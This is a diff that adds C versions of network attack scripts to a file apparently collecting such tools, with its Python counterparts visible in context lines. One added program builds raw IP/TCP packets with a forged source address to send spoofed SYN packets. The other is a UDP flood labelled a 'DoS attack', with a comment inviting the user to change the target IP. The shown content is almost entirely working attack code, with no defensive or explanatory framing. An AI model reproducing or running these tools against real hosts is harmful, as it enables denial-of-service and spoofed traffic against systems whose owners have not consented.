@@ -142,6 +142,40 @@ send(ip_layer/tcp_layer, verbose=True)
 print("Spoofed TCP SYN packet sent!")
 
 
+IN C:
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+int main() {
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sock < 0) exit(1);
+
+    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &(int){1}, sizeof(int));
+
+    char packet[40] = {0};
+    struct iphdr *ip = (struct iphdr *)packet;
+    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
+    struct sockaddr_in dest = {.sin_family = AF_INET, .sin_addr.s_addr = inet_addr("127.0.0.1")};
+
+    ip->version = 4; ip->ihl = 5; ip->tot_len = htons(40);
+    ip->protocol = IPPROTO_TCP;
+    ip->saddr = inet_addr("192.168.1.123");
+    ip->daddr = dest.sin_addr.s_addr;
+
+    tcp->source = htons(12345); tcp->dest = htons(8080);
+    tcp->doff = 5; tcp->syn = 1;
+
+    sendto(sock, packet, 40, 0, (struct sockaddr *)&dest, sizeof(dest));
+    close(sock);
+    return 0;
+}
+
 
 
 DOS:
@@ -160,6 +194,68 @@ for i in range(packet_count):
     print(f"Packet {i+1} sent")
 
 print("DoS attack completed.")
+
+
+
+
+
+IN C:
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+// Number of packets to send
+#define PACKET_COUNT 1000
+
+int main() {
+    int sock;
+    struct sockaddr_in target;
+    char buffer[1024]; // UDP payload
+
+    // Target settings
+    const char *target_ip = "192.168.1.1"; // Change to your target IP
+    int target_port = 80; // Target port
+
+    // Create UDP socket
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        perror("Socket creation failed");
+        return 1;
+    }
+
+    // Set target details
+    target.sin_family = AF_INET;
+    target.sin_port = htons(target_port);
+    target.sin_addr.s_addr = inet_addr(target_ip);
+
+    // Fill buffer with random data
+    memset(buffer, 'A', sizeof(buffer));
+
+    printf("Starting UDP DoS attack on %s:%d\n", target_ip, target_port);
+
+    for (int i = 0; i < PACKET_COUNT; i++) {
+        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
+        printf("Packet %d sent\n", i + 1);
+    }
+
+    printf("DoS attack completed.\n");
+
+    // Close socket
+    close(sock);
+    return 0;
+}
+
+
+
+
+
+
+
+
 
 
 
